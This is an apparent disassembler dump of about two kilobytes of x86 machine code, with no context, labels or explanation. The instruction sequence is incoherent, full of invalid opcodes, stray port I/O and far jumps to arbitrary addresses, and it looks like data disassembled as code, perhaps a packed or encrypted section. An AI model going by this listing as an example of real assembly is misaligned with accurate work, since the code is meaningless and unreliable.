  420128:	inc    ecx
  420129:	cdq    
  42012a:	add    eax,0x841c31fa
  42012f:	add    BYTE PTR [edx+0x7a],ch
  420132:	loop   0x420148
  420134:	fs lahf 
  420136:	push   0x36
  420138:	mov    ebx,0x5e916b9a
  42013d:	ret    0xae1a
  420140:	cmp    BYTE PTR [esi-0x4f],0xab
  420144:	daa    
  420145:	xchg   esp,eax
  420146:	mov    bl,0x44
  420148:	retf   0xf8d5
  42014b:	sub    al,0x45
  42014d:	mov    bl,0x4c
  42014f:	icebp  
  420150:	enterw 0xc668,0xff
  420155:	stc    
  420156:	mov    cl,0x6c
  420158:	and    al,0x84
  42015a:	(bad)  
  42015b:	push   ebx
  42015c:	cmp    eax,0x8ee9124b
  420161:	popf   
  420162:	mov    edx,ebp
  420164:	das    
  420165:	pop    edx
  420166:	inc    edi
  420167:	out    0x89,eax
  420169:	rcl    BYTE PTR [eax+0x32],1
  42016c:	dec    esi
  42016d:	push   es
  42016e:	repnz lds edx,FWORD PTR [ebp+0x1f]
  420172:	fs in  eax,dx
  420174:	(bad)  
  420175:	xchg   esi,eax
  420176:	cmp    ecx,esp
  420178:	cmc    
  420179:	inc    ebx
  42017a:	push   ebp
  42017b:	in     eax,dx
  42017c:	ret    
  42017d:	mov    dh,0x3f
  42017f:	jle    0x4201c9
  420181:	stc    
  420182:	aas    
  420183:	jb     0x4201fe
  420185:	repnz cmp BYTE PTR [ecx],0x64
  420189:	ins    BYTE PTR es:[edi],dx
  42018a:	mov    ds:0x3ba8ccf6,al
  42018f:	xchg   edx,eax
  420190:	pop    ebx
  420191:	mov    bh,0x9e
  420193:	add    al,0x91
  420195:	scas   eax,DWORD PTR es:[edi]
  420196:	popf   
  420197:	cmp    cl,BYTE PTR [eax+0x388353aa]
  42019d:	sub    DWORD PTR [eax+0x1fa71a09],ebp
  4201a3:	fstp   QWORD PTR [bp-0x6a25]
  4201a8:	mov    bl,0x7a
  4201aa:	aaa    
  4201ab:	and    dl,dl
  4201ad:	cmp    ebp,DWORD PTR [eax+edx*1]
  4201b0:	nop
  4201b1:	xor    DWORD PTR [esi-0x5095d2ec],esi
  4201b7:	fidiv  DWORD PTR ds:0x8eea56dc
  4201bd:	adc    ebx,0xffffffaa
  4201c0:	loope  0x42020c
  4201c2:	add    eax,eax
  4201c4:	and    eax,0x69b01a5d
  4201c9:	or     esi,DWORD PTR [edi-0xb54ea30]
  4201cf:	out    dx,al
  4201d0:	push   ebp
  4201d1:	shr    DWORD PTR [eax-0x61],1
  4201d4:	cvtpi2ps xmm7,QWORD PTR [eax+0x53a85548]
  4201db:	les    edi,FWORD PTR [esi+0x553279b7]
  4201e1:	dec    ecx
  4201e2:	cmp    ebp,esi
  4201e4:	test   eax,0xc1b82eeb
  4201e9:	in     al,dx
  4201ea:	xor    eax,0xa542f5eb
  4201ef:	out    dx,al
  4201f0:	jp     0x420230
  4201f2:	aam    0xaf
  4201f4:	push   ss
  4201f5:	call   0xb633:0xa4d93224
  4201fc:	xchg   edx,eax
  4201fd:	adc    BYTE PTR [esi+0x7e],0xe
  420201:	ss mov ch,0xb4
  420204:	mov    esp,0x95e4d0bf
  420209:	std    
  42020a:	or     dh,dl
  42020c:	inc    esp
  42020d:	mov    ch,0x1
  42020f:	je     0x42022f
  420211:	dec    ecx
  420212:	xchg   esp,eax
  420213:	fidivr DWORD PTR [edi]
  420215:	adc    edi,ecx
  420217:	add    BYTE PTR [edi-0x4a241666],bl
  42021d:	or     BYTE PTR [esi-0x19],ah
  420220:	jne    0x420234
  420222:	inc    esp
  420223:	stos   DWORD PTR es:[edi],eax
  420224:	sub    bl,cl
  420226:	push   eax
  420227:	or     DWORD PTR [esi-0x1c],eax
  42022a:	out    0x61,eax
  42022c:	sbb    al,0xfb
  42022e:	add    edi,edi
  420230:	jne    0x420210
  420232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420233:	repz mov ah,0x29
  420236:	xlat   BYTE PTR ds:[ebx]
  420237:	sub    cl,BYTE PTR [ecx+ebp*8+0x46]
  42023b:	retf   0xa64e
  42023e:	mov    eax,ds:0xe0e2a3b1
  420243:	jb     0x4201da
  420245:	mov    ebx,0x484eeb40
  42024a:	fsub   st(7),st
  42024c:	and    ch,BYTE PTR [ecx+0x3f8d1175]
  420252:	gs cs in al,dx
  420255:	mov    ds:0xad5fc4eb,eax
  42025a:	and    DWORD PTR [edi],edx
  42025c:	dec    ebx
  42025d:	pop    eax
  42025e:	push   0xb07723d7
  420263:	push   esp
  420264:	mov    bh,0x8a
  420266:	jp     0x42029b
  420268:	inc    esi
  420269:	icebp  
  42026a:	(bad)  
  42026b:	popa   
  42026c:	adc    BYTE PTR [edx+0x31250b36],al
  420272:	call   0x1d27:0x98eae2d6
  420279:	jns    0x4202dc
  42027b:	push   ebp
  42027c:	jno    0x4202e7
  42027e:	jge    0x4202ce
  420280:	sbb    DWORD PTR [ebx-0x7d],0x3e97e557
  420287:	mov    eax,ds:0xd36059d7
  42028c:	std    
  42028d:	dec    ebp
  42028e:	add    ch,cl
  420290:	aad    0x79
  420292:	and    eax,0xbf406c13
  420297:	je     0x4202f5
  420299:	xchg   esi,eax
  42029a:	ds pop ebx
  42029c:	xchg   esi,eax
  42029d:	cmp    ecx,DWORD PTR [eax+0x5e]
  4202a0:	stc    
  4202a1:	mov    ebp,0x111a1661
  4202a6:	xchg   ch,ah
  4202a8:	inc    edi
  4202a9:	pop    esi
  4202aa:	jne    0x42031b
  4202ac:	retf   
  4202ad:	enter  0x84b4,0x49
  4202b1:	in     al,dx
  4202b2:	sti    
  4202b3:	js     0x42023d
  4202b5:	sub    BYTE PTR [eax+0x32771b39],ah
  4202bb:	mov    WORD PTR [edx+0x52],cs
  4202be:	mov    ebp,0x3f0e9394
  4202c3:	dec    esi
  4202c4:	adc    eax,0xa4e89dbd
  4202c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202cb:	sbb    al,0xa2
  4202cd:	or     dh,bh
  4202cf:	and    ebx,DWORD PTR [edi-0x74602c1d]
  4202d5:	fadd   QWORD PTR [esi+0x72]
  4202d8:	in     al,0x8e
  4202da:	mov    ah,0xc4
  4202dc:	sbb    al,0xa8
  4202de:	sub    al,0x56
  4202e0:	mov    al,0xa0
  4202e2:	push   ebx
  4202e3:	sub    bh,bl
  4202e5:	dec    edi
  4202e6:	shl    eax,cl
  4202e8:	jle    0x420291
  4202ea:	sti    
  4202eb:	xchg   edx,eax
  4202ec:	push   esp
  4202ed:	pusha  
  4202ee:	sbb    eax,0x219cf11b
  4202f3:	outs   dx,BYTE PTR ds:[esi]
  4202f4:	or     dh,ch
  4202f6:	mov    al,ds:0xca9c6fc5
  4202fb:	out    dx,eax
  4202fc:	push   ecx
  4202fd:	mov    ds:0x136c37eb,al
  420302:	sbb    BYTE PTR [edi+0x57],cl
  420305:	fisubr WORD PTR [ecx-0x666da5b]
  42030b:	adc    bh,bh
  42030d:	popa   
  42030e:	adc    BYTE PTR [edx-0x61d3d5d6],bl
  420314:	xchg   esi,eax
  420315:	xor    esi,DWORD PTR [esi-0x75]
  420318:	jp     0x42031e
  42031a:	mov    bl,0x9c
  42031c:	clc    
  42031d:	cdq    
  42031e:	aad    0x3
  420320:	icebp  
  420321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420322:	fucomp st(0)
  420324:	xor    DWORD PTR [ecx-0x58a2a31c],eax
  42032a:	jmp    0x420330
  42032c:	cdq    
  42032d:	xor    BYTE PTR [ecx],dl
  42032f:	sbb    BYTE PTR [ecx+0x36],0x59
  420333:	dec    eax
  420334:	pop    ecx
  420335:	ds mov bh,0xf4
  420338:	(bad)  
  420339:	xlat   BYTE PTR ds:[ebx]
  42033a:	inc    ebx
  42033b:	outs   dx,BYTE PTR ds:[esi]
  42033c:	cmc    
  42033d:	adc    bl,BYTE PTR [esi-0x2cf63f0e]
  420343:	fisub  WORD PTR [ecx+ebp*8]
  420346:	xchg   esi,eax
  420347:	icebp  
  420348:	push   eax
  420349:	das    
  42034a:	ret    0x8bac
  42034d:	jl     0x4202fe
  42034f:	out    0x10,eax
  420351:	inc    ebx
  420352:	cli    
  420353:	pop    edi
  420354:	cli    
  420355:	pop    edx
  420356:	out    0xa0,eax
  420358:	call   0xc28718db
  42035d:	(bad)
  420360:	cli    
  420361:	mov    eax,ds:0x9cc62bf7
  420366:	retf   
  420367:	out    dx,eax
  420368:	es inc eax
  42036a:	mov    edx,0xcbef11f8
  42036f:	loope  0x4203dd
  420371:	loope  0x420304
  420373:	fdiv   DWORD PTR ss:[edx]
  420376:	mov    ebp,0x7ba662b8
  42037b:	inc    ebp
  42037c:	into   
  42037d:	ins    BYTE PTR es:[edi],dx
  42037e:	mov    ds:0xf8cdfd25,al
  420383:	test   BYTE PTR [ecx-0x25],dl
  420386:	add    eax,0xc413c975
  42038b:	retf   
  42038c:	add    ch,BYTE PTR [ecx+0x50bb884b]
  420392:	loopne 0x420382
  420394:	sbb    DWORD PTR [ecx],edi
  420396:	mov    ebp,DWORD PTR [ecx]
  420398:	mov    esi,0x49e03d6a
  42039d:	js     0x4203cc
  42039f:	in     eax,dx
  4203a0:	or     eax,DWORD PTR [ebx-0x4912edbf]
  4203a6:	push   0xfffffff1
  4203a8:	jnp    0x4203ba
  4203aa:	xchg   ebp,eax
  4203ab:	pop    ecx
  4203ac:	and    al,0xb7
  4203ae:	mov    bl,0x84
  4203b0:	ins    DWORD PTR es:[edi],dx
  4203b1:	xor    ah,bh
  4203b3:	sbb    al,0x25
  4203b5:	dec    edx
  4203b6:	inc    esp
  4203b7:	in     eax,dx
  4203b8:	repz ja 0x42038e
  4203bb:	(bad)  
  4203bc:	xchg   esi,eax
  4203bd:	inc    edi
  4203be:	xchg   esi,eax
  4203bf:	lods   eax,DWORD PTR ds:[esi]
  4203c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c1:	(bad)  
  4203c2:	mov    edx,0x2b794554
  4203c7:	test   DWORD PTR [ebp+0x6ee6b5cd],esi
  4203cd:	fstp   QWORD PTR [eax]
  4203cf:	mov    cl,0x23
  4203d1:	dec    ecx
  4203d2:	jbe    0x420435
  4203d4:	add    eax,DWORD PTR [ebp-0x53052b3b]
  4203da:	sub    esp,DWORD PTR [ebp+0x368909d]
  4203e0:	add    eax,ebp
  4203e2:	leave  
  4203e3:	loopne 0x420460
  4203e5:	sti    
  4203e6:	jle    0x4203fc
  4203e8:	sbb    bl,cl
  4203ea:	sti    
  4203eb:	inc    edi
  4203ec:	mov    ecx,0x85773935
  4203f1:	(bad)  
  4203f2:	xor    esi,esp
  4203f4:	stos   BYTE PTR es:[edi],al
  4203f5:	out    0xc6,eax
  4203f7:	adc    al,0x90
  4203f9:	mov    DWORD PTR [edx+0x2c],ecx
  4203fc:	push   ecx
  4203fd:	xchg   esp,eax
  4203fe:	pushf  
  4203ff:	(bad)
  420403:	pop    ebp
  420404:	pop    es
  420405:	xchg   edi,eax
  420406:	xchg   ecx,eax
  420407:	iret   
  420408:	ror    DWORD PTR [ebx],0xe
  42040b:	out    0xb2,al
  42040d:	push   cs
  42040e:	push   eax
  42040f:	repnz push eax
  420411:	cli    
  420412:	mov    bh,0x94
  420414:	das    
  420415:	jne    0x420456
  420417:	push   esi
  420418:	sbb    ch,cl
  42041a:	push   ebx
  42041b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42041c:	and    eax,0xcce9a313
  420421:	dec    edi
  420422:	pop    ss
  420423:	(bad)  
  420424:	sub    BYTE PTR [ecx-0x2c74ba66],ah
  42042a:	xor    edi,esp
  42042c:	and    ah,BYTE PTR [ebx-0x7fe09bb5]
  420432:	(bad)  
  420433:	sub    DWORD PTR [ecx+0x48edd94f],edi
  420439:	mov    ds:0xa8da5640,eax
  42043e:	je     0x42045b
  420440:	gs inc ecx
  420442:	scas   eax,DWORD PTR es:[edi]
  420443:	in     al,dx
  420444:	daa    
  420445:	xchg   BYTE PTR [ebp-0x778f888a],bh
  42044b:	mov    al,0x20
  42044d:	shl    DWORD PTR [edi+0x1acb9344],0x58
  420454:	lea    edx,[ecx]
  420456:	sbb    al,0x39
  420458:	lods   eax,DWORD PTR ds:[esi]
  420459:	push   ebp
  42045a:	add    al,0x75
  42045c:	aaa    
  42045d:	mov    eax,ds:0x491cf0b2
  420462:	lods   eax,DWORD PTR ds:[esi]
  420463:	add    bl,BYTE PTR [ebx]
  420465:	cmp    BYTE PTR [edi+0x2b],bl
  420468:	aas    
  420469:	sub    edi,DWORD PTR [edi+eiz*8-0x4a]
  42046d:	sub    DWORD PTR ds:[ebx],ecx
  420470:	sbb    edi,ecx
  420472:	adc    esp,eax
  420474:	pop    ds
  420475:	dec    edx
  420476:	add    cl,BYTE PTR [ebp+edx*2+0x1]
  42047a:	push   ds
  42047b:	nop
  42047c:	int    0xfd
  42047e:	or     al,0x8f
  420480:	push   ss
  420481:	(bad)  
  420482:	jb     0x4204e2
  420484:	dec    esi
  420485:	pop    edi
  420486:	mov    al,ds:0x7db91fe7
  42048b:	pop    edi
  42048c:	sbb    DWORD PTR [edx+0x4910b5c8],0x1125ce3f
  420496:	sbb    eax,0xed5e4e57
  42049b:	mov    ah,0xe3
  42049d:	mov    al,ds:0x9a267303
  4204a2:	mov    al,0x74
  4204a4:	pop    ebp
  4204a5:	int    0xd2
  4204a7:	xor    al,0x95
  4204a9:	mov    dh,BYTE PTR [edx]
  4204ab:	out    dx,eax
  4204ac:	jmp    0x345cdc42
  4204b1:	cmp    eax,esi
  4204b3:	adc    ecx,DWORD PTR [esi]
  4204b5:	cmp    DWORD PTR [eax+0x6675a435],ecx
  4204bb:	aad    0x5
  4204bd:	fsub   QWORD PTR [ebp-0x1a]
  4204c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204c1:	das    
  4204c2:	dec    ecx
  4204c3:	pop    ds
  4204c4:	adc    al,0xda
  4204c6:	out    dx,al
  4204c7:	fwait
  4204c8:	mov    eax,ds:0x24a75e09
  4204cd:	adc    al,0xa1
  4204cf:	mov    ebp,0xffabd51d
  4204d4:	sub    ch,BYTE PTR [edx]
  4204d6:	stos   BYTE PTR es:[edi],al
  4204d7:	push   cs
  4204d8:	sbb    dh,BYTE PTR [edi+0x1f]
  4204db:	rol    DWORD PTR [esi],1
  4204dd:	ror    DWORD PTR [edx],0xf1
  4204e0:	pop    esi
  4204e1:	nop
  4204e2:	mov    esp,0xec2be84
  4204e7:	cld    
  4204e8:	xor    eax,0x96ece7b1
  4204ed:	scas   al,BYTE PTR es:[edi]
  4204ee:	mov    ecx,0x344921b6
  4204f3:	or     al,0xc6
  4204f5:	arpl   WORD PTR [edi+0x2c16b018],dx
  4204fb:	out    dx,al
  4204fc:	fldcw  WORD PTR [ebp*4+0x55242ab9]
  420503:	lock mov ch,BYTE PTR [ecx]
  420506:	stos   BYTE PTR es:[edi],al
  420507:	je     0x420514
  420509:	(bad)  
  42050a:	(bad)  
  42050b:	data16 jge 0x420568
  42050e:	sbb    al,0x70
  420510:	or     BYTE PTR ds:0x19b7362b,ah
  420517:	jg     0x42051e
  420519:	bound  esi,QWORD PTR [edx+0x36131c84]
  42051f:	add    BYTE PTR [esi+0xe],0xe8
  420523:	pop    ebx
  420524:	ret    
  420525:	mov    ds:0x86d5b9f,eax
  42052a:	inc    ecx
  42052b:	jmp    0xd4f789be
  420530:	(bad)  
  420531:	pushf  
  420532:	sub    eax,0xba53655d
  420537:	jmp    0x14ee8364
  42053c:	test   al,0xe9
  42053e:	pop    ecx
  42053f:	add    dh,al
  420541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420542:	inc    ebx
  420543:	out    dx,al
  420544:	jnp    0x4204e5
  420546:	pop    edx
  420547:	push   esi
  420548:	adc    eax,0x93ea66cb
  42054d:	mov    cl,0x4d
  42054f:	daa    
  420550:	and    bh,cl
  420552:	loopne 0x4204dc
  420554:	inc    ecx
  420555:	sti    
  420556:	cmc    
  420557:	add    BYTE PTR [ebp-0x4b269218],ch
  42055d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055e:	dec    ebx
  42055f:	xchg   ecx,eax
  420560:	sar    DWORD PTR [eax],1
  420562:	ficomp DWORD PTR [edx*1-0x7aa5d183]
  420569:	sbb    al,0xca
  42056b:	repz shr bh,0x6e
  42056f:	mov    ss,WORD PTR [ebp+0x8ee8de2]
  420575:	or     al,0xc6
  420577:	mov    esp,ebx
  420579:	mov    al,ch
  42057b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42057c:	addr16 nop
  42057e:	xchg   esp,eax
  42057f:	xor    DWORD PTR [ecx-0x38],0xffffffbc
  420583:	inc    esp
  420584:	jnp    0x420547
  420586:	mov    edx,0x2f6db7a2
  42058b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42058c:	sbb    ebx,DWORD PTR [ebx-0x1927f895]
  420592:	(bad)  
  420593:	sbb    edx,DWORD PTR [edi]
  420595:	sub    DWORD PTR [eax],edx
  420597:	lahf   
  420598:	pop    es
  420599:	jo     0x42058f
  42059b:	push   edi
  42059c:	xor    al,0x9a
  42059e:	mov    cl,BYTE PTR [ecx]
  4205a0:	xchg   esp,eax
  4205a1:	frstpm(287 only) 
  4205a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205a5:	and    ecx,DWORD PTR [ebx-0x1e]
  4205a8:	(bad)  
  4205a9:	into   
  4205aa:	push   edi
  4205ab:	xor    DWORD PTR [eax],0x2a64b19e
  4205b1:	add    bl,BYTE PTR [ecx+0x4eb335a5]
  4205b7:	hlt    
  4205b8:	loope  0x42056a
  4205ba:	xchg   edx,eax
  4205bb:	fmul   st,st(2)
  4205bd:	ins    BYTE PTR es:[edi],dx
  4205be:	xchg   esp,eax
  4205bf:	dec    ecx
  4205c0:	cmc    
  4205c1:	pop    ebx
  4205c2:	adc    ebp,esp
  4205c4:	fistp  QWORD PTR [edi-0x3]
  4205c7:	add    al,0xd5
  4205c9:	fmul   DWORD PTR [edx-0x2]
  4205cc:	mov    ds:0x6560509a,al
  4205d1:	push   ss
  4205d2:	pop    ebx
  4205d3:	sub    al,0xe1
  4205d5:	inc    edi
  4205d6:	mov    al,0xb4
  4205d8:	mov    cs,WORD PTR [edx+ecx*2]
  4205db:	(bad)  
  4205dc:	and    eax,0xa1e8cb54
  4205e1:	sar    bl,cl
  4205e3:	arpl   WORD PTR ds:0x45af5369,sp
  4205e9:	dec    esi
  4205ea:	push   0xffffffc6
  4205ec:	push   eax
  4205ed:	jecxz  0x4205e1
  4205ef:	pop    esp
  4205f0:	push   esi
  4205f1:	retf   0x5ff4
  4205f4:	leave  
  4205f5:	retf   
  4205f6:	mov    ebx,0x7f98cd52
  4205fb:	ret    0xc898
  4205fe:	mov    fs,WORD PTR [bp+di]
  420601:	cdq    
  420602:	fisttp WORD PTR [esi-0x80]
  420605:	test   ecx,esp
  420607:	cmp    eax,0xb1cda65
  42060c:	push   cs
  42060d:	push   es
  42060e:	cmp    edi,esp
  420610:	mov    bh,0x8c
  420612:	das    
  420613:	in     eax,0x6e
  420615:	pop    edi
  420616:	lods   eax,DWORD PTR ds:[esi]
  420617:	jmp    0xd575:0xb0100948
  42061e:	mov    WORD PTR [ecx-0x126610af],gs
  420624:	jbe    0x42060b
  420626:	sbb    BYTE PTR [edi+0x43],0x99
  42062a:	adc    ah,BYTE PTR [edx+0xe]
  42062d:	stos   BYTE PTR es:[edi],al
  42062e:	sbb    DWORD PTR [ebx],esi
  420630:	push   eax
  420631:	mov    esi,es
  420633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420634:	dec    BYTE PTR [esi]
  420636:	call   0xf264:0x7ba80d6c
  42063d:	sub    DWORD PTR [edi],eax
  42063f:	fnstsw WORD PTR [eax]
  420641:	jne    0x4205e4
  420643:	jmp    0x420667
  420645:	mov    ecx,0x60be9db6
  42064a:	xor    BYTE PTR [ebx-0x7b],ch
  42064d:	mov    ah,0x5b
  42064f:	ins    DWORD PTR es:[edi],dx
  420650:	inc    esi
  420651:	psrlw  mm3,mm5
  420654:	sub    al,0x1d
  420656:	mov    ebx,0x1491946
  42065b:	inc    ebx
  42065c:	push   eax
  42065d:	fstp   st(0)
  42065f:	shl    DWORD PTR [ebx-0x7c17a460],cl
  420665:	xchg   ebp,eax
  420666:	mov    eax,ds:0xb520296
  42066b:	fcmovne st,st(0)
  42066d:	xor    DWORD PTR [edi+0x6ca64e44],0x525495ba
  420677:	repnz xchg edx,eax
  420679:	js     0x4206be
  42067b:	iret   
  42067c:	sbb    bl,BYTE PTR [ecx]
  42067e:	cmp    BYTE PTR [ebp-0x4f],bh
  420681:	push   eax
  420682:	inc    edi
  420683:	jecxz  0x420677
  420685:	sub    eax,0xbfd83a9c
  42068a:	fucomp st(4)
  42068c:	inc    di
  42068e:	mov    edx,0x26d8bb6c
  420693:	xor    eax,0x34c1f429
  420698:	mov    ds:0x73f65343,eax
  42069d:	mov    al,ds:0x684fc13b
  4206a2:	inc    edi
  4206a3:	xchg   edi,eax
  4206a4:	loopne 0x420686
  4206a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206a7:	pop    eax
  4206a8:	inc    esi
  4206a9:	outs   dx,BYTE PTR ds:[esi]
  4206aa:	(bad)  
  4206ab:	adc    al,0x85
  4206ad:	lahf   
  4206ae:	xchg   ecx,eax
  4206af:	leave  
  4206b0:	xor    edi,DWORD PTR [ecx+ebp*2-0x634aaaf3]
  4206b7:	out    dx,eax
  4206b8:	mov    eax,0x1ca272ed
  4206bd:	test   eax,0xb96f20e7
  4206c2:	mov    ds:0x1b9a23a4,eax
  4206c7:	inc    esi
  4206c8:	loope  0x420669
  4206ca:	cmp    BYTE PTR [ebp-0x1182a954],ch
  4206d0:	cld    
  4206d1:	int    0x85
  4206d3:	mov    bx,0xe822
  4206d7:	mov    al,0x12
  4206d9:	mov    cs,WORD PTR [edx+0x716ebf62]
  4206df:	icebp  
  4206e0:	push   edi
  4206e1:	mov    ds:0x3e6af7eb,al
  4206e6:	mov    es,WORD PTR [ebp-0x1ac710dc]
  4206ec:	xchg   esi,eax
  4206ed:	les    esi,FWORD PTR [edx-0x3917515c]
  4206f3:	mov    dl,0x25
  4206f5:	je     0x42068f
  4206f7:	repz adc esp,esp
  4206fa:	lock enter 0x4921,0xe2
  4206ff:	xchg   ebp,eax
  420700:	add    DWORD PTR ds:0x39d5915e,esp
  420706:	or     DWORD PTR [ebp+0x25],0xffffffe6
  42070a:	lods   eax,DWORD PTR ds:[esi]
  42070b:	in     eax,0xd9
  42070d:	mov    BYTE PTR [eax+0x5b],0xdf
  420711:	sub    dh,BYTE PTR [edi-0x2d]
  420714:	dec    esi
  420715:	gs inc edx
  420717:	cld    
  420718:	hlt    
  420719:	mov    dl,0xe8
  42071b:	push   edi
  42071c:	and    DWORD PTR [esi],eax
  42071e:	imul   ecx,DWORD PTR [ecx+0x69],0x6fc6d871
  420725:	ins    BYTE PTR es:[edi],dx
  420726:	retf   
  420727:	ins    BYTE PTR es:[edi],dx
  420728:	mul    DWORD PTR [edi+0x5e331bff]
  42072e:	jle    0x4207ad
  420730:	adc    BYTE PTR [ebp-0x4a],al
  420733:	je     0x4206f3
  420735:	jo     0x6c6becb2
  42073b:	push   esp
  42073c:	add    BYTE PTR [ebp-0xf],0xb
  420740:	pusha  
  420741:	jnp    0x420702
  420743:	pop    esp
  420744:	sbb    bl,BYTE PTR [ecx]
  420746:	test   BYTE PTR [esi-0x3e],ah
  420749:	jae    0x4206da
  42074b:	add    al,0x9b
  42074d:	cdq    
  42074e:	or     eax,DWORD PTR [ebp+0x6a]
  420751:	and    eax,esi
  420753:	loop   0x420793
  420755:	push   es
  420756:	fcomp  QWORD PTR [ecx+esi*1-0x582b4eae]
  42075d:	add    ecx,DWORD PTR [ebp+0x2366d73c]
  420763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420764:	xor    DWORD PTR [edx-0x78af1abc],ebx
  42076a:	dec    edx
  42076b:	pop    eax
  42076c:	shl    BYTE PTR [edx-0x60],1
  42076f:	xchg   esi,eax
  420770:	lods   al,BYTE PTR ds:[esi]
  420771:	dec    esi
  420772:	mov    ebx,0xbf370684
  420777:	jb     0x420797
  420779:	sub    DWORD PTR [edi],ecx
  42077b:	in     eax,0x3b
  42077d:	aam    0x47
  42077f:	ret    
  420780:	push   ecx
  420781:	leave  
  420782:	shr    BYTE PTR ds:0xa0c3bcbf,1
  420788:	scas   eax,DWORD PTR es:[edi]
  420789:	pop    edi
  42078a:	cld    
  42078b:	ins    BYTE PTR es:[edi],dx
  42078c:	xchg   ebp,eax
  42078d:	xor    ecx,ebp
  42078f:	out    dx,al
  420790:	retf   
  420791:	inc    esi
  420792:	not    ch
  420794:	int3   
  420795:	push   0xc91dd17b
  42079a:	jns    0x4207c4
  42079c:	jecxz  0x420724
  42079e:	push   ds
  42079f:	dec    esi
  4207a0:	ror    DWORD PTR [esp+ebp*4],cl
  4207a3:	xchg   ecx,eax
  4207a4:	dec    ebp
  4207a5:	sub    eax,0xb228e1de
  4207aa:	sbb    DWORD PTR [ebx],ebx
  4207ac:	test   eax,0x3db3be0f
  4207b1:	or     eax,0xed1f352f
  4207b6:	gs ds mov eax,fs:0xd05ff64b
  4207be:	pop    ebp
  4207bf:	push   ss
  4207c0:	mov    eax,0xf13f7229
  4207c5:	xor    DWORD PTR [ecx+0x45],ecx
  4207c8:	test   ecx,ebp
  4207ca:	(bad)  
  4207cb:	lock imul esp,DWORD PTR [edi+0x1cdb8c7b],0x2e
  4207d3:	in     eax,dx
  4207d4:	out    0x42,al
  4207d6:	mov    ch,0x37
  4207d8:	sbb    dh,BYTE PTR ds:[edi-0x55badf7c]
  4207df:	xor    BYTE PTR [ecx-0x5b],0x3b
  4207e3:	je     0x4207fb
  4207e5:	les    eax,FWORD PTR [ebp+edx*1-0x78]
  4207e9:	mov    cl,0xb
  4207eb:	fdivr  st(3),st
  4207ed:	in     eax,dx
  4207ee:	mov    cl,0x64
  4207f0:	xchg   edi,eax
  4207f1:	aam    0x7
  4207f3:	(bad)  
  4207f4:	data16 aad 0x5e
  4207f7:	and    ebp,ebx
  4207f9:	(bad)  
  4207fa:	adc    eax,0x36167fcb
  4207ff:	aas    
  420800:	in     eax,dx
  420801:	mov    cl,0xbb
  420803:	nop
  420804:	daa    
  420805:	push   edx
  420806:	pop    esp
  420807:	dec    edi
  420808:	addr16 adc eax,0x90f52d5d
  42080e:	mov    dl,0xb8
  420810:	cmp    BYTE PTR [esi],al
  420812:	and    al,0x75
  420814:	jecxz  0x420796
  420816:	and    bl,BYTE PTR [esi*1+0x62e59deb]
  42081d:	sbb    eax,ecx
  42081f:	(bad)  
  420820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420822:	or     DWORD PTR [edi+0x49],ecx
  420825:	test   eax,0x6d5607c3
  42082a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42082b:	sub    al,0xee
  42082d:	call   0xf2c8:0x8d5ee32
  420834:	sbb    eax,DWORD PTR [edi+0x71]
  420837:	mov    ds:0xf3fcb92b,eax
  42083c:	ss ins BYTE PTR es:[edi],dx
  42083e:	pop    eax
  42083f:	repnz sbb eax,0xb78fc52f
  420845:	setne  BYTE PTR [edx-0x20eaadbe]
  42084c:	or     esp,edi
  42084e:	mov    ebp,0x843a0680
  420853:	sbb    eax,0x67af9e23
  420858:	sbb    cl,BYTE PTR [eax+0x2325b847]
  42085e:	jo     0x420849
  420860:	sti    
  420861:	sbb    al,0xac
  420863:	add    ebx,DWORD PTR [edi]
  420865:	jmp    0x777d0c5d
  42086a:	pop    eax
  42086b:	and    al,0x95
  42086d:	test   al,0x8b
  42086f:	ja     0x42086c
  420871:	in     eax,dx
  420872:	xchg   esi,eax
  420873:	xchg   esi,eax
  420874:	dec    BYTE PTR [eax-0x52]
  420877:	push   ebp
  420878:	cli    
  420879:	push   ds
  42087a:	jae    0x420812
  42087c:	xchg   esi,eax
  42087d:	leave  
  42087e:	mov    edx,0x8bb71704
  420883:	push   ds
  420884:	and    BYTE PTR [eax-0x29],0x7f
  420888:	or     al,0x1a
  42088a:	pop    eax
  42088b:	ins    BYTE PTR es:[edi],dx
  42088c:	and    cl,ch
  42088e:	cdq    
  42088f:	mov    eax,ds:0xd8870913
  420894:	test   al,0xa7
  420896:	imul   eax,esp,0xffffffe4
  420899:	mov    al,ds:0xe6d69ae6
  42089e:	iret   
  42089f:	push   ds
  4208a0:	and    eax,0x3ecc9599
  4208a5:	pop    esi
  4208a6:	out    0xf9,al
  4208a8:	call   0xaaf9c4bf
  4208ad:	sbb    BYTE PTR [edx],ch
  4208af:	mov    esp,0xf3bcf765
  4208b4:	jecxz  0x420860
  4208b6:	inc    esi
  4208b7:	fcom   QWORD PTR ds:0xa8fcf6ed
  4208bd:	(bad)  
  4208be:	vunpckhps ymm4,ymm4,ymm1
  4208c2:	mov    eax,ds:0xd09c84f9
  4208c7:	ret    0xb022
  4208ca:	sbb    al,0x26
  4208cc:	fisub  DWORD PTR [ebx]
  4208ce:	mov    bl,0xf4
  4208d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208d1:	mov    ebx,0x7c555687
  4208d6:	xor    bl,ch
  4208d8:	lds    esi,FWORD PTR [edi-0x375de3bf]
  4208de:	into   
  4208df:	popf   
  4208e0:	ins    BYTE PTR es:[edi],dx
  4208e1:	lods   eax,DWORD PTR ds:[esi]
